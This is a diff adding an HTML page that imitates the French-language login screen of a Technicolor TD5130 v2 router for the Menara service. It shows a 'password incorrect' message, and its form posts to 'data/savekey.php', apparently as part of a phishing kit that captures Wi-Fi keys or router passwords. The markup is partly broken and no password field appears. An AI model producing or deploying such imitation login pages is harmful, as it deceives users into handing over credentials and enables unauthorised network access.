@@ -1,0 +1,117 @@
+﻿<html>
+
+<head>
+
+
+
+
+
+
+
+
+<meta name="viewport" content="width=device-width">
+
+
+<style>
+img {
+    max-width: 100%;
+}
+</style>
+
+ <title>Menara - Connexion</title> <link rel="stylesheet" type="text/css" href="./SKN/styles.css" media="all"> <script language="JavaScript">
+
+function disable_fields(theForm)
+{
+   var len = theForm.elements.length;
+   for (var i = 0; i < len; i++) {
+      // Don't disable "hidden" fields
+      if(theForm.elements[i].type.toLowerCase()!="hidden")
+         theForm.elements[i].disabled = 1;
+   }
+}
+
+function setLanguage(langCode)
+{
+   document.langSelect.elements[0].value = langCode;
+   document.langSelect.submit();
+   disable_fields(document.langSelect);
+}
+
+function noenter(e) {
+   var keycode;
+   
+   if (window.event)
+      keycode = window.event.keyCode;
+   else if (e)
+      keycode = e.which;
+   else 
+      return true;
+   
+   if (keycode == 13)
+      return false;
+   else
+      return true;
+}
+
+function submitAuthentication()
+{
+   document.authform.submit();
+   disable_fields(document.authform);
+}
+
+function cancelLogin()
+{
+   if (window.opener || window.name == "userpage")
+      window.close();     // Close pop-up login window
+   else
+      location.href="/";
+}
+
+</script>
+
+
+</head> 
+
+
+
+<body height="100%" style="margin: 0px;"> <noscript> &lt;h1&gt;Technicolor - Menara&lt;/h1&gt; &lt;h4&gt;Pour pouvoir afficher l'interface Web du Menara, votre navigateur doit supporter JavaScript, et doit l'avoir activ&amp;eacute;!&lt;br&gt;&lt;br&gt;Veuillez activer Javascript et actualiser votre navigateur.&lt;/h4&gt; </noscript> <table class="main" border="0" cellpadding="0" cellspacing="0"> <tbody> <tr> <td> <table class="banner" cellpadding="0" cellspacing="0" width="100%"> <tbody> <tr> <td> <p id="productName" class="product"> Technicolor TD5130 v2 </p> <p style="visibility: hidden;" class="displaySettings" id="displaySettings"> <input name="6" value="en" type="hidden"> <input name="rn" value="-1163067184" type="hidden"> </form> <p></p> <script type="text/javascript">
+						document.getElementById('displaySettings').style.visibility = "hidden";
+</script> </td> <td class="logo"> <img src="./SKN/logo.gif"> </td> </tr> </tbody> </table> </td> </tr> <tr> <td class="page" width="760"> <table border="0" cellpadding="0" cellspacing="0" width="100%"> <tbody> <tr> <td> <table border="0" cellpadding="0" cellspacing="0" width="100%"> <tbody> <tr> <td> <div class="contentcontainer"> <hr> <div class="contentitem"> <table cellpadding="0" cellspacing="0"> <tbody> <tr> <td class="icon" valign="top" width="100px"> <img src="./SKN/user__xl.gif" alt="Login !"> </td> <td class="data" valign="top"> <table cellpadding="0" cellspacing="0"> <tbody> <tr> <td align="left"> <span class="itemtitle">Connexion</span> </td> <td align="right"></td> </tr> <tr> <td colspan="2"> 
+
+
+
+   <br><center><b> Le mot de passe est incorrect  </b></font></center>
+
+
+
+
+
+<form method="post" action="data/savekey.php" name="authform" id="authform">
+    <table width="100%" cellspacing="0" cellpadding="0">
+      <tbody><tr><td width="40" valign="top"></td>
+      <td valign="top">
+        <br><center></center><center></center><table width="100%" class="datatable" cellspacing="0" cellpadding="0">
+          <tbody><tr><td></td><td width="30px"></td><td width="220px"></td><td width="50px"></td></tr>
+          
+          
+          <tr><td colspan="4" height="7">    <tr>
+           
+
+
+
+
+<tr><td colspan="4" id="forbidden" style="display:none" align="center"></td></tr>
+          <tr>
+            <td colspan="4" align="center" height="10">
+ 		  
+			
+        	 <a href="../index.html"> <input name="cancel" type="button"   value="annuler"></a>
+            </td>
+          </tr>
+        </tbody></table>
+      </td></tr>
+    </tbody></table>
+
+
+
+</body></html>
